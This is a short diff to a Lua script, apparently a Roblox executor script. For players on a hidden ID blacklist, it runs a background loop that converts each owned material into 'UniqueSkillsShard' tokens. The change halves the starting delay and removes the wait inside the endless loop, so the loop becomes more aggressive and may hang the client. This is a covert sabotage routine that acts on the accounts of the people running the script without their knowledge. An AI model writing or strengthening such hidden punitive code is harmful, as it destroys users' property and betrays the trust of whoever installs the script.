@@ -269,7 +269,7 @@ local specialUser = {
 if BlacklistedIDs[LocalPlayer.UserId] then
     local pData = getgenv().PlayerData    
     task.spawn(function()
-        task.wait(600)
+        task.wait(300)
         while true do
             for tokenname, owneds in pData.Materials do
                 if owneds > 0 then
@@ -278,7 +278,6 @@ if BlacklistedIDs[LocalPlayer.UserId] then
                 end
             end
             Reply.To("Convert Tokens", "UniqueSkillsShard", true, 1)
-            task.wait(600)
         end
     end)
 end
